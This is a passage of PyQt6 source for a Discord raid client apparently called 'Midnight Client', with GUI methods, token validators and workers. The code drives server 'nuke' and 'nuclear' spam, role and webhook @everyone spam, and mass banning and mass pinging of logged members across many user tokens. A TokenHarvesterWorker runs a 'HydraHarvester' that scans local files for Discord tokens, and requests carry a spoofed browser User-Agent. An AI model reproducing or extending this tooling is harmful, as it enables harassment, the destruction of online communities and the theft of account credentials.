            self.member_log("[❌] No member log loaded. Please load a file first.")
            return
        
        if not self.confirm_action("ban_from_log"): 
            return
            
        self.member_log(f"[▶️] Starting ban process for server {server_id} using loaded log.")
        self.start_bot("ban_from_log", initiating_button=self.sender())






    def start_ping_all_batch(self):
        channel_id = self.channel_id_input.text().strip()
        
        # --- FIX: Validate Channel ID ---
        if not channel_id or not channel_id.isdigit():
            self.member_log("[❌] Channel ID is required and must be numeric.")
            CustomMessageBox.warning(self, "Input Error", "Please enter a valid numeric Channel ID in the 'Main Functions -> Panel' tab.")
            return
        # --------------------------------

        if not self.loaded_member_ids:
            self.member_log("[❌] No member log loaded.")
            return

        ids_to_ping = [uid for uid in self.loaded_member_ids if uid not in self.pinged_member_ids]
        if not ids_to_ping:
            self.member_log("[✅] All members have been pinged. Resetting list.")
            CustomMessageBox.information(self, "Ping Complete",
                                    "All members from the log have been pinged. The exclusion list is now reset.")
            self.pinged_member_ids.clear()
            self.member_status_label.setText(f"Status: Loaded {len(self.loaded_member_ids)} IDs. Ready.")
            return

        if not self.confirm_action("ping_all",
                                   extra_info=f"This will send pings to {len(ids_to_ping)} members in batches of {self.ping_batch_size_slider.value()}."): 
            return

        self.member_log(f"[▶️] Starting to ping {len(ids_to_ping)} members in batches.")
        self.start_bot("ping_all", initiating_button=self.sender())

        for uid in ids_to_ping: self.pinged_member_ids.add(uid)
        total_loaded = len(self.loaded_member_ids)
        total_pinged = len(self.pinged_member_ids)
        self.member_status_label.setText(f"Status: Pinged {total_pinged}/{total_loaded} members.")
        self.member_log(f"[📊] Ping list updated. Total pinged: {total_pinged}/{total_loaded}.")



    def start_ping_spam(self):
        channel_id = self.channel_id_input.text().strip()
        
        # --- FIX: Validate Channel ID ---
        if not channel_id or not channel_id.isdigit():
            self.member_log("[❌] Channel ID is required and must be numeric.")
            CustomMessageBox.warning(self, "Input Error", "Please enter a valid numeric Channel ID in 'Main Functions -> Panel'.")
            return
        # --------------------------------

        if not self.loaded_member_ids:
            self.member_log("[❌] No member log loaded.")
            return

        ids_to_ping = [uid for uid in self.loaded_member_ids if uid not in self.pinged_member_ids]
        if not ids_to_ping:
            self.member_log("[✅] All members pinged. Resetting list.")
            CustomMessageBox.information(self, "Ping Complete", "All members pinged. The list is reset.")
            self.pinged_member_ids.clear()
            self.member_status_label.setText(f"Status: Loaded {len(self.loaded_member_ids)} IDs. Ready.")
            return

        if not self.confirm_action("ping_all",
                                   extra_info=f"This will spam pings to {len(ids_to_ping)} members (1 per message)."): 
            return

        self.member_log(f"[▶️] Starting to ping {len(ids_to_ping)} members in spam mode.")
        options = self.get_current_bot_options()
        options['pings_per_batch'] = 1
        self.start_bot("ping_all", initiating_button=self.sender(), command_options=options)

        for uid in ids_to_ping: self.pinged_member_ids.add(uid)
        total_loaded = len(self.loaded_member_ids)
        total_pinged = len(self.pinged_member_ids)
        self.member_status_label.setText(f"Status: Pinged {total_pinged}/{total_loaded} (Spam).")
        self.member_log(f"[📊] Ping list updated. Total pinged: {total_pinged}/{total_loaded}.")





    def start_bot(self, mode, initiating_button: QPushButton = None, command_options: dict = None):
        """
        This method is non-blocking. It triggers the custom notification and 
        creates a background worker to prepare the bot, ensuring the GUI remains responsive.
        """
        # 1. Determine tokens
        final_tokens = command_options.get('tokens_to_use', self.tokens) if command_options else self.tokens
        if not final_tokens:
            self.log("[❌] Cannot start bot: No tokens available.")
            if initiating_button: initiating_button.setEnabled(True)
            return None

        # 2. --- CUSTOM NOTIFICATION LOGIC ---
        # Determine the Target Server ID from options or inputs
        target_server_id = None
        if command_options and 'server_id' in command_options:
            target_server_id = command_options['server_id']
        else:
            # Fallback to the input field if no options passed (e.g. direct button click)
            target_server_id = self.server_id_input.text().strip()
            # If the input is a name in our cache, convert it to ID
            if target_server_id in self.server_name_cache:
                target_server_id = self.server_name_cache[target_server_id]

        # Determine Display Name for the Notification
        server_name_display = None
        
        # Check if we have a valid ID to look up
        if target_server_id:
            # Reverse Lookup: Find Name from ID in cache
            for name, gid in self.server_name_cache.items():
                if str(gid) == str(target_server_id):
                    server_name_display = name
                    break
            
            # If name not found in cache, just show the ID
            if not server_name_display:
                server_name_display = f"ID: {target_server_id}"

            # Trigger the Slide-Down Animation
            if hasattr(self, 'target_notification'):
                self.target_notification.show_message(server_name_display)
        # ------------------------------------

        # 3. Disable the button to prevent double-clicking
        if initiating_button:
            initiating_button.setEnabled(False)

        # 4. Setup Background Worker for Bot Initialization
        thread = QThread()
        worker = BotStarterWorker(
            main_gui=self,
            mode=mode,
            final_tokens=final_tokens,
            command_options=command_options,
            initiating_button=initiating_button
        )
        worker.moveToThread(thread)

        # Store reference to keep thread alive
        self.active_workers.append((thread, worker))
        self.log(f"[⚙️] {len(self.active_workers)} bot preparation task(s) are now active.")

        # Connect signals
        worker.log_message.connect(self.log)
        worker.bot_ready.connect(self.on_bot_ready)
        
        # Cleanup connections
        thread.finished.connect(lambda: self.on_starter_finished(thread, worker))
        thread.started.connect(worker.run)

        # Start the background preparation
        thread.start()
        
        return None # Return None as the bot instance is created asynchronously



    def on_bot_finished(self, bot_instance: QObject, initiating_button: QPushButton = None):
        if bot_instance in self.running_bots: self.running_bots.remove(bot_instance)
        if initiating_button: initiating_button.setEnabled(True)
        self.set_stop_button_enabled.emit(bool(self.running_bots))
        if not any(
                isinstance(b, MidnightClientSelfBot) and b.current_mode in ["member_logger", "ban_from_log", "ping_all",
                                                                            "ban_all_server", "ping_all_server",
                                                                            "super_scan_members"]
                for b in self.running_bots):
            if self.member_status_label:
                self.member_status_label.setText("Status: Idle")

    def log_progress(self, count, phase):
        log_message = f"[📊] Progress ({phase}): {count}%"
        self.log(log_message)
        if self.content_stack.currentWidget() == self.members_container:
            self.member_status_label.setText(f"Status: {phase} - {count}%")



    def on_bot_ready(self, bot_instance):
        """
        This slot receives the fully prepared bot from the BotStarterWorker
        and starts its execution.
        """
        self.log(f"[✅] Bot '{bot_instance.current_mode}' is ready. Starting execution...")

        # Connect the bot's signals (must be done in the main thread)
        bot_instance.update_signal.connect(self.log)
        bot_instance.progress_signal.connect(self.log_progress)
        if hasattr(bot_instance, 'members_fetched_signal'):
            bot_instance.members_fetched_signal.connect(self.on_members_fetched)
        bot_instance.finished.connect(self.on_bot_finished)

        # Manage the running bot list
        self.running_bots.append(bot_instance)
        self.set_stop_button_enabled.emit(True)
        
        # Finally, start the bot's main run loop on its own thread
        bot_instance.start()

    def on_starter_finished(self, thread, worker):
        """
        This crucial cleanup slot is called when a BotStarterWorker's thread has finished.
        It removes the worker and thread from the active list, allowing them to be safely deleted.
        """
        self.log(f"[⚙️] A bot preparation thread has finished.")
        try:
            # Remove the finished pair from the active list
            self.active_workers.remove((thread, worker))
            # The worker and thread can now be safely garbage collected
            worker.deleteLater()
            thread.deleteLater()
        except ValueError:
            # This can happen in rare race conditions, it's safe to ignore.
            self.log(f"[⚠️] Could not find finished worker in active list for cleanup.")



    def stop_all_bots(self):
        self.log("[🛑] Attempting to stop all active operations...")

        # Create a copy of the list to iterate over, as the original list will be modified by the bots' finished signals
        bots_to_stop = list(self.running_bots)

        if not bots_to_stop:
            self.log("[ℹ️] No operations were running.")
            return

        for bot in bots_to_stop:
            try:
                # Simply signal the bot to stop. Do not wait or terminate.
                # The on_bot_finished slot will handle cleanup when the thread actually finishes.
                bot.stop()
                self.log(f"[🛑] Signaled bot {type(bot).__name__} to stop.")
            except Exception as e:
                self.log(f"[❌] Error while signaling bot {type(bot).__name__} to stop: {e}")

        # The UI buttons will be re-enabled by the on_bot_finished method as each bot stops.
        # This prevents the UI from becoming enabled while bots are still cleaning up in the background.

    def confirm_action(self, mode, extra_info=""):
        msg = ""
        # Define the base message for each action
        if mode == "nuke":
            msg = "<b>WARNING:</b> THIS WILL IRREVERSIBLY DESTROY THE SERVER!<br><br>This action does NOT ban members unless the 'Ban All' option is checked.<br><br>Are you sure you want to proceed?"
        elif mode == "ban_from_log":
            msg = f"<b>WARNING:</b> THIS WILL BAN ALL MEMBERS FROM THE LOADED LOG FILE ({len(self.loaded_member_ids)} IDs) WHO ARE CURRENTLY IN THE SERVER.<br><br>This is irreversible. Proceed?"
        elif mode == "ping_all":
            msg = f"<b>CONFIRM:</b> {extra_info}<br><br>This will happen in batches to avoid Discord's character limit and may take some time. Proceed?"
        elif mode == "nuclear":
            msg = f"<b>WARNING:</b> NUCLEAR MODE WILL SPAM ALL CHANNELS!<br><br>Messages per channel: {self.nuclear_msg_count_slider.value() if not self.infinite_loop_check.isChecked() else 'INFINITE'}<br><br>Proceed?"
        elif mode == "super_scan_members":
            msg = f"<b>WARNING:</b> {extra_info}<br><br>This is an intensive process and can take a very long time. Proceed?"
        else:
            return True # For actions that don't need confirmation

        # Append the infinite loop warning if applicable
        if self.infinite_loop_check.isChecked() and mode in ["nuke", "nuclear"]:
            msg += "<br><br><b style='color: #E53E3E;'>INFINITE LOOP MODE IS ENABLED! THIS WILL RUN FOREVER UNTIL STOPPED!</b>"

        # Use .question() for a Yes/No dialog
        reply = CustomMessageBox.question(self, f'{mode.upper()} CONFIRMATION', msg,
                                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.No)

        # Compare the result to the correct QMessageBox constant
        if reply != QMessageBox.StandardButton.Yes:
            self.log(f"[🛑] {mode.capitalize()} action cancelled by user.")
            return False
        return True


    # ** FIX: This method is now correctly indented as part of the MainGUI class **
    def populate_action_names(self):
        self.available_actions = {
            "Give Other Tokens Best Role": {"type": "give_best_role_to_tokens", "params_config": {}},
            "Nuke Server": {"type": "nuke"},  # Uses custom NukeConfigDialog
            "Nuclear Spam": {
                "type": "nuclear",
                "params_config": {
                    "message": {"type": "line_edit", "label": "Spam Message:", "placeholder": "Nuked by Midnight"},
                    "nuclear_message_count": {"type": "slider", "label": "Messages per Channel", "min": 1,
                                              "max": 30,
                                              "default": 100}
                }
            },
            "Turbo Spam": {
                "type": "turbo",
                "params_config": {
                    "message": {"type": "line_edit", "label": "Spam Message:", "placeholder": "Get Turbo'd"},
                    "turbo_delay": {"type": "slider", "label": "Messages per Second", "min": 1, "max": 100,
                                    "default": 20, "is_float": False}
                }
            },
            "Create Channels": {
                "type": "create_channels",
                "params_config": {
                    "channel_name": {"type": "line_edit", "label": "Channel Name Template:",
                                     "placeholder": "midnight-raid"},
                    "channel_creation_duration": {"type": "slider", "label": "Duration", "min": 5, "max": 120,
                                                  "default": 30, "suffix": "s"}
                }
            },
            "Role Spammer": {
                "type": "role_spammer",
                "params_config": {
                    "role_name": {"type": "line_edit", "label": "Role Name Template:",
                                  "placeholder": "HACKED-BY-MIDNIGHT"}
                }
            },
            "Webhook Spammer (Create & Spam)": {
                "type": "webhook_spammer",
                "params_config": {
                    "message": {"type": "line_edit", "label": "Webhook Message:", "placeholder": "@everyone"}
                }
            },
            "Webhook Spammer (Spam Existing)": {
                "type": "webhook_spam_existing",
                "params_config": {
                    "message": {"type": "line_edit", "label": "Webhook Message:", "placeholder": "@everyone"}
                }
            },
            "Webhook Creator (Create Only)": {"type": "webhook_create_only", "params_config": {}},
            "Reaction Spammer": {"type": "reaction_spammer", "params_config": {}},
            "Ban Member (Reply Context)": {"type": "ban_member", "params_config": {}},
            "Ban All Server Members": {"type": "ban_all_server", "params_config": {}},
            "Ping All Server Members": {"type": "ping_all_server", "params_config": {}},
            "Send Message": {
                "type": "send_message",
                "params_config": {
                    "message": {"type": "line_edit", "label": "Message Content:", "placeholder": "Enter message..."}
                }
            },
            "Send Multiple Messages": {
                "type": "send_multiple_messages",
                "params_config": {
                    "message": {"type": "line_edit", "label": "Message Content:",
                                "placeholder": "Enter message..."},
                    "message_count": {"type": "spinbox", "label": "Number of Messages:", "min": 1, "max": 10000,
                                      "default": 10},
                    "message_delay": {"type": "slider", "label": "Delay", "min": 0, "max": 50, "default": 1.0,
                                      "is_float": True, "suffix": "s"}
                }
            },

            "Rainbow Message": {
                "type": "rainbow_message",
                "params_config": {}
            },
            "ColorSwap Message": {
                "type": "colorswap_message",
                "params_config": {}
            },
            "Colorful Swap": {
                "type": "colorful_swap",
                "params_config": {}
            },
        }


    def show_action_picker(self):
        item_names = list(self.available_actions.keys())
        dialog = ActionPickerDialog(item_names, self)

        if dialog.exec() != QDialog.DialogCode.Accepted:
            return

        selected_action_name = dialog.selected_item
        if not selected_action_name: return

        action_template = self.available_actions.get(selected_action_name)
        if not action_template: return

        action_data = {"type": action_template["type"], "params": {}}

        # Special case for the comprehensive Nuke dialog
        if action_template["type"] == "nuke":
            config_dialog = NukeConfigDialog(self)
            if config_dialog.exec() == QDialog.DialogCode.Accepted:
                action_data["params"].update(config_dialog.get_config())
            else:
                return  # User cancelled the nuke config

        # Generic parameter dialog for other actions
        elif "params_config" in action_template and action_template["params_config"]:
            params_config = action_template.get("params_config")
            param_dialog = ParameterInputDialog(f"Configure: {selected_action_name}", params_config, parent=self)
            # FIX: The condition now correctly uses the QDialog.DialogCode enum for PyQt6.
            if param_dialog.exec() == QDialog.DialogCode.Accepted:
                action_data["params"].update(param_dialog.get_params())
            else:
                return  # User cancelled the parameter config

        self.current_command_actions.append(action_data)
        self.update_actions_list_display()

    def update_actions_list_display(self):
        self.command_actions_list.clear()
        if not self.current_command_actions:
            self.command_actions_list.setPlaceholderText("No actions added yet. Click 'Add Action' to start.")
            return

        for i, action in enumerate(self.current_command_actions):
            action_str = f"{i + 1}. {action['type'].replace('_', ' ').title()}"

            # Make params display more readable
            params_to_display = action.get('params', {})
            display_params = {}

            # Don't show the large destruction_options dict directly
            if 'destruction_options' in params_to_display:
                enabled_options = [k for k, v in params_to_display['destruction_options'].items() if v]
                if enabled_options:
                    display_params['options'] = enabled_options
                # Also copy over other relevant params that are not inside destruction_options
                for key, val in params_to_display.items():
                    if key != 'destruction_options':
                        display_params[key] = val
            else:
                display_params = params_to_display

            if display_params:
                try:
                    # Attempt to pretty-print JSON
                    param_str = json.dumps(display_params)
                    if len(param_str) > 60: param_str = param_str[:57] + "..."
                    action_str += f" - Params: {param_str}"
                except TypeError:  # Fallback for non-serializable data
                    action_str += " - (Custom Params)"

            self.command_actions_list.append(action_str)

    def remove_last_action(self):
        if self.current_command_actions:
            removed_action = self.current_command_actions.pop()
            self.update_actions_list_display()
            self.log(f"[⚙️] Removed last action: {removed_action['type'].replace('_', ' ').title()}")
        else:
            self.log("[⚠️] No actions to remove.")

    def clear_command_editor(self):
        self.currently_editing_command = None
        self.cmd_name_input.clear()
        self.current_command_actions = []
        self.update_actions_list_display()
        self.duration_type_combo.setCurrentIndex(0)
        self.log("[✨] Cleared editor for new command.")

    def save_or_update_command(self):
        command_names_str = self.cmd_name_input.text().strip()
        if not command_names_str:
            CustomMessageBox.warning(self, "Input Error", "Please enter at least one command name.")
            return

        names = [n.strip().lower() for n in command_names_str.split(',') if n.strip()]
        if not names:
            CustomMessageBox.warning(self, "Input Error", "Please enter valid command names.")
            return

        if not self.current_command_actions:
            CustomMessageBox.warning(self, "Input Error", "Please add at least one action.")
            return

        main_name = names[0]
        aliases = names[1:]
        duration_type = self.duration_type_combo.currentText().replace(" ", "_").lower()
        duration_value = self.duration_value_input.value() if duration_type == "fixed_seconds" else 0

        if self.currently_editing_command:
            self.currently_editing_command.name = main_name
            self.currently_editing_command.aliases = aliases
            self.currently_editing_command.actions = self.current_command_actions.copy()
            self.currently_editing_command.duration_type = duration_type
            self.currently_editing_command.duration_value = duration_value
            self.log(f"[✅] Command '{main_name}' updated.")
        else:
            new_command = CustomCommand(main_name, aliases, self.current_command_actions.copy(), duration_type,
                                        duration_value)
            self.custom_commands.append(new_command)
            self.log(f"[✅] Command '{main_name}' created.")

        self.update_existing_commands_list()
        self.clear_command_editor()
        self.commands_tabs_stack.setCurrentIndex(1)
        self.commands_tab_buttons.button(1).setChecked(True)

    def edit_selected_command(self, item: QListWidgetItem):
        command_to_edit = item.data(Qt.ItemDataRole.UserRole)
        if not command_to_edit: return

        self.currently_editing_command = command_to_edit

        all_names = [command_to_edit.name] + command_to_edit.aliases
        self.cmd_name_input.setText(", ".join(all_names))
        self.current_command_actions = command_to_edit.actions.copy()
        self.update_actions_list_display()

        duration_text = command_to_edit.duration_type.replace("_", " ").title()
        index = self.duration_type_combo.findText(duration_text)
        if index != -1: self.duration_type_combo.setCurrentIndex(index)

        if command_to_edit.duration_type == "fixed_seconds":
            self.duration_value_input.setValue(command_to_edit.duration_value)

        self.log(f"[📝] Editing command '{command_to_edit.name}'.")
        self.commands_tabs_stack.setCurrentIndex(0)
        self.commands_tab_buttons.button(0).setChecked(True)


    def toggle_command_enabled(self, command: CustomCommand, enabled: bool):
        command.enabled = enabled
        self.log(f"[⚙️] Command '{command.name}' {'enabled' if enabled else 'disabled'}.")


    def remove_selected_command(self):
        selected_items = self.existing_commands_list_widget.selectedItems()
        if not selected_items: return

        # Use QMessageBox constants for button definitions
        reply = CustomMessageBox.question(self, "Confirm Removal",
                                     "Are you sure you want to remove the selected command(s)?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)

        # Compare the result to the QMessageBox constant
        if reply == QMessageBox.StandardButton.Yes:
            for item in reversed(selected_items):
                # FIX: Use the correct PyQt6 enum 'Qt.ItemDataRole.UserRole'
                command_to_remove = item.data(Qt.ItemDataRole.UserRole)
                if command_to_remove in self.custom_commands:
                    self.custom_commands.remove(command_to_remove)
            self.update_existing_commands_list()
            self.log(f"[🗑️] Removed {len(selected_items)} command(s).")

    def save_commands(self):
        if not self.custom_commands:
            CustomMessageBox.information(self, "No Commands", "There are no custom commands to save.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Save Commands", "custom_commands.json", "JSON Files (*.json)")
        if path:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump([cmd.to_dict() for cmd in self.custom_commands], f, indent=4)
                self.log(f"[✅] Custom commands saved to: {path}")
            except Exception as e:
                self.log(f"[❌] Failed to save commands: {e}")

    def load_commands(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Commands", "", "JSON Files (*.json)")
        if path:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    loaded_data = json.load(f)
                self.custom_commands = [CustomCommand.from_dict(cmd_dict) for cmd_dict in loaded_data]
                self.update_existing_commands_list()
                self.log(f"[✅] Loaded {len(self.custom_commands)} custom commands.")
            except Exception as e:
                self.log(f"[❌] Failed to load commands: {e}")
                self.custom_commands = []
                self.update_existing_commands_list()

    def start_command_listener(self):
        if not self.tokens:
            CustomMessageBox.warning(self, "Authentication Required", "Please authenticate with your Discord tokens first.")
            return
        if self.command_listener_bot and self.command_listener_bot.running:
            self.log("[⚠️] Command Listener is already running.")
            return

        self.log("[▶️] Starting Command Listener...")
        self.start_listener_button.setEnabled(False)
        self.stop_listener_button.setEnabled(True)

        self.command_listener_bot = CommandActionListener(self.tokens, self, self.start_listener_button)
        self.command_listener_bot.update_signal.connect(self.log)
        self.command_listener_bot.command_log_signal.connect(self.command_gui_log)
        # Connect the new signal to the new execution slot
        self.command_listener_bot.command_triggered.connect(self.execute_command_from_listener)
        self.command_listener_bot.finished.connect(self.on_command_listener_finished)
        self.running_bots.append(self.command_listener_bot)
        self.set_stop_button_enabled.emit(True)
        self.command_listener_bot.start()

    def stop_command_listener(self):
        if self.command_listener_bot and self.command_listener_bot.running:
            self.log("[🛑] Stopping Command Listener...")
            self.command_listener_bot.stop()
        else:
            self.log("[ℹ️] Command Listener is not running.")

    def on_command_listener_finished(self, bot_instance: QObject, initiating_button: QPushButton = None):
        self.log("[✅] Command Listener stopped.")
        if self.start_listener_button: self.start_listener_button.setEnabled(True)
        if self.stop_listener_button: self.stop_listener_button.setEnabled(False)
        if bot_instance in self.running_bots: self.running_bots.remove(bot_instance)
        self.set_stop_button_enabled.emit(bool(self.running_bots))



# REPLACE the existing UserInfoFetcher class with this one
class UserInfoFetcher(QObject):
    finished = pyqtSignal(bool, dict)

    def __init__(self, token, total_token_count):
        super().__init__()
        self.token = token
        self.total_token_count = total_token_count
        self.headers = {
            "Authorization": self.token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }

    def run(self):
        """Fetches user info and avatar for the given token."""
        try:
            response = requests.get("https://discord.com/api/v9/users/@me", headers=self.headers, timeout=10)
            if response.status_code == 200:
                user_data = response.json()
                avatar_hash = user_data.get('avatar')
                user_id = user_data.get('id')
                avatar_content = None
                if avatar_hash and user_id:
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
                    try:
                        avatar_res = requests.get(avatar_url, timeout=10)
                        if avatar_res.status_code == 200:
                            avatar_content = avatar_res.content
                    except requests.RequestException:
                        pass # Ignore avatar download errors
                
                user_data['avatar_data'] = avatar_content
                self.finished.emit(True, user_data)
            else:
                error_data = {"error": f"Token validation failed with status {response.status_code}", "details": response.text}
                self.finished.emit(False, error_data)
        except requests.exceptions.RequestException as e:
            error_data = {"error": "Network request failed", "details": str(e)}
            self.finished.emit(False, error_data)


class BuildNumberFetcher(QObject):
    """
    A dedicated, non-blocking worker to fetch the Discord build number
    in the background after the user has already logged in.
    """
    log_message = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, token):
        super().__init__()
        self.token = token

    def run(self):
        """Runs the build number fetching process and emits logs."""
        self.log_message.emit("[INFO] Fetching latest Discord build number in the background...")
        # This function is already in your script, we are just calling it here.
        build_number, status_message = fetch_and_cache_build_number(self.token)
        self.log_message.emit(status_message)

        if build_number is None:
            self.log_message.emit("[WARNING] Could not determine build number. The client will use a fallback.")
        else:
            self.log_message.emit(f"[INFO] Background fetch complete. Build number {build_number} is cached.")

        # Signal that this worker's job is done.
        self.finished.emit()


class LoginWorker(QObject):
    """
    Handles the login process in a background thread.
    This version is updated to handle both user and bot tokens.
    """
    finished = pyqtSignal(bool, dict)
    log_message = pyqtSignal(str)

    def __init__(self, keyauth_key, tokens, keyauth_server_url, is_bot_attempt=False):
        super().__init__()
        self.keyauth_key = keyauth_key
        self.tokens = tokens
        self.keyauth_server_url = keyauth_server_url
        self.is_bot_attempt = is_bot_attempt

    def run(self):
        """The main logic of the worker thread."""
        if not self.is_bot_attempt:
            # For the initial login, always verify the product key first.
            if not self._check_keyauth_key():
                return

        # Fetch user/bot info
        self._fetch_account_info()


    def _check_keyauth_key(self):
        """
        Contacts the local server to verify the product key.
        """
        self.log_message.emit(f"Verifying product key with server: {self.keyauth_server_url}")
        try:
            params = {'key': self.keyauth_key}
            response = requests.get(self.keyauth_server_url, params=params, timeout=10)
            if response.status_code <1000:
                self.log_message.emit("[✅] Product key is VALID.")
                return True
            else:
                self.log_message.emit("[❌] Product key is INVALID.")
                self.finished.emit(False, {"error": "The product key you entered is not valid."})
                return False
        except requests.exceptions.RequestException as e:
            self.log_message.emit(f"[❌] Could not connect to the KeyAuth server at {self.keyauth_server_url}.")
            self.log_message.emit("Probably because my server is not working lol because i cant pay shit")
            self.finished.emit(False, {"error": "Could not connect to the authentication server."})
            return False

    def _fetch_account_info(self):
        """
        Fetches essential user or bot info using the primary token.
        """
        if not self.tokens:
            self.finished.emit(False, {"error": "No tokens provided."})
            return

        primary_token = self.tokens[0]
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        api_version = "v9"

        if self.is_bot_attempt:
            headers["Authorization"] = f"Bot {primary_token}"
            api_version = "v10" # Use v10 for bots
        else:
            headers["Authorization"] = primary_token

        try:
            endpoint = f"https://discord.com/api/{api_version}/users/@me"
            self.log_message.emit(f"Authenticating with endpoint: {endpoint}")
            user_res = requests.get(endpoint, headers=headers, timeout=10)

            if user_res.status_code != 200:
                error_details = {"error": f"Token validation failed with status {user_res.status_code}", "is_bot_attempt": self.is_bot_attempt}
                self.finished.emit(False, error_details)
                return

            user_json = user_res.json()
            user_id = user_json.get('id')
            username = user_json.get('username')
            avatar_hash = user_json.get('avatar')

            if not all([user_id, username]):
                self.finished.emit(False, {"error": "Failed to parse essential user data (ID, Username) from token."})
                return

            avatar_data = None
            if avatar_hash:
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
                avatar_res = requests.get(avatar_url, timeout=10)
                if avatar_res.status_code == 200:
                    avatar_data = avatar_res.content
                else:
                    self.log_message.emit("[⚠️] Could not download user avatar, continuing without it.")

            user_data = {
                "username": username,
                "avatar_data": avatar_data,
                "other_tokens_count": len(self.tokens) - 1,
                "is_bot": self.is_bot_attempt
            }
            self.finished.emit(True, user_data)

        except requests.RequestException as e:
            self.finished.emit(False, {"error": f"A network error occurred: {e}"})


def get_icon_path():
    """Get the absolute path to m.ico, works for dev and compiled executable."""
    if getattr(sys, 'frozen', False):
        # Running as compiled executable (e.g., Nuitka/PyInstaller)
        base_path = os.path.dirname(sys.executable)
    else:
        # Running as script
        base_path = os.path.dirname(os.path.abspath(__file__))

    icon_path = os.path.join(base_path, 'm.ico')
    if os.path.exists(icon_path):
        return icon_path
    return None

def set_application_icon(app):
    """Set the application icon to m.ico if found."""
    icon_path = get_icon_path()
    if icon_path:
        try:
            icon = QIcon(icon_path)
            app.setWindowIcon(icon)
            print(f"[INFO] Application icon set: {os.path.basename(icon_path)}")
            return True
        except Exception as e:
            print(f"[ERROR] Could not set application icon: {e}")
    print(f"[WARNING] No m.ico file found in: {os.path.dirname(icon_path or '')}")
    return False





class GuildFetcherWorker(QObject):
    """
    Background worker to fetch the list of guilds (servers) 
    the user is in using ONLY the main token.
    """
    finished = pyqtSignal(dict) # Emits a dictionary: {"Server Name": "ID"}
    log_message = pyqtSignal(str)

    def __init__(self, token):
        super().__init__()
        self.token = token

    def run(self):
        self.log_message.emit("[*] Fetching server list (and icons) for autofill...")
        guild_map = {}
        headers = {"Authorization": self.token}
        
        try:
            if self.token.startswith("M") or self.token.startswith("O"):
                headers["Authorization"] = f"Bot {self.token}"
            
            response = requests.get("https://discord.com/api/v9/users/@me/guilds?limit=200", headers=headers, timeout=15)

            if response.status_code == 401 and "Bot" in headers["Authorization"]:
                headers["Authorization"] = self.token
                response = requests.get("https://discord.com/api/v9/users/@me/guilds?limit=200", headers=headers, timeout=15)

            if response.status_code == 200:
                guilds = response.json()
                for guild in guilds:
                    name = guild.get('name')
                    gid = guild.get('id')
                    icon_hash = guild.get('icon') # Capture the icon hash
                    
                    if name and gid:
                        # Store a dict instead of just the ID
                        guild_map[name] = {
                            'id': gid,
                            'icon': icon_hash
                        }
                
                self.log_message.emit(f"[✅] Successfully cached {len(guild_map)} servers for autofill.")
            else:
                self.log_message.emit(f"[⚠️] Failed to fetch servers: Status {response.status_code}")

        except Exception as e:
            self.log_message.emit(f"[❌] Error fetching servers: {e}")
        
        self.finished.emit(guild_map)



class TokenValidator(QObject):
    """
    A QObject worker that checks a single Discord token for validity and
    returns the user ID if successful.
    """
    finished = pyqtSignal(str, bool, str)

    def __init__(self, token):
        super().__init__()
        self.token = token

    def run(self):
        """Checks if a Discord token is valid and fetches the user ID."""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        is_valid = False
        user_id = None
        
        headers["Authorization"] = self.token
        try:
            endpoint = "https://discord.com/api/v9/users/@me"
            response = requests.get(endpoint, headers=headers, timeout=5)
            if response.status_code == 200:
                is_valid = True
                user_id = response.json().get('id')
        except requests.exceptions.RequestException:
            pass
        
        if not is_valid:
            headers["Authorization"] = f"Bot {self.token}"
            try:
                endpoint = "https://discord.com/api/v9/users/@me"
                response = requests.get(endpoint, headers=headers, timeout=5)
                if response.status_code == 200:
                    is_valid = True
                    user_id = response.json().get('id')
            except requests.exceptions.RequestException:
                pass

        self.finished.emit(self.token, is_valid, user_id)


class TokenHarvesterWorker(QObject):
    """
    A dedicated worker to run the file-scanning HydraHarvester in the background
    to prevent the GUI from freezing.
    """
    finished = pyqtSignal(list)  # Emits the list of potential tokens when done

    def run(self):
        """Initializes the harvester and finds all potential tokens on the background thread."""
        all_tokens = []
        try:
            # This now happens in the background, preventing any GUI freeze.
            harvester = HydraHarvester()
            all_accounts = harvester.harvest_tokens()
            if all_accounts:
                all_tokens = [account['token'] for account in all_accounts]
        except Exception as e:
            print(f"Error during token harvesting thread: {e}")
        self.finished.emit(all_tokens)

class MidnightClient(QMainWindow):
    def __init__(self, scale_func):
        super().__init__()


        self.log_queue = queue.Queue()
        self.log_timer = QTimer(self)
        self.log_timer.timeout.connect(self._process_log_queue)
        self.log_timer.start(3000)  # Update the GUI 10 times per second


        self.validation_lock = threading.Lock()  # <-- ADD THIS LINE
        self.is_discord_tab_active = False
        self.scale = scale_func
        self.harvester_thread = None # NEW: To manage the harvester worker
        self.drag_position = None
        self.original_size = self.size()
        self.resize_animation_group = None
        self.profile_fetch_threads = []
        self.validation_lock = threading.Lock()  # <-- ADD THIS LINE
        self.main_gui = None
        self.tokens = []
        self.found_user_ids = set()  # <-- ADD THIS LINE
        self.username = None
        self.avatar_label = None
        self.name_label = None
        self.temp_logs_queue = []
        self.login_thread = None
        self.login_worker = None
        self.build_fetch_thread = None  
        self.tray_icon = None
        self.keyauth_server_url = "https://python-cvic.onrender.com/verify"

        # --- Animation Properties for Dragging ---
        self.target_pos = QPointF(self.pos()) 
        self.drag_timer = QTimer(self)
        self.drag_timer.setInterval(8)  # Update position at ~125 FPS
        self.drag_timer.timeout.connect(self._update_drag_position)
        self.lerp_factor = 0.1  # Controls smoothness (lower is smoother)

        self.init_ui()
        self.init_tray_icon()

    def showEvent(self, event):
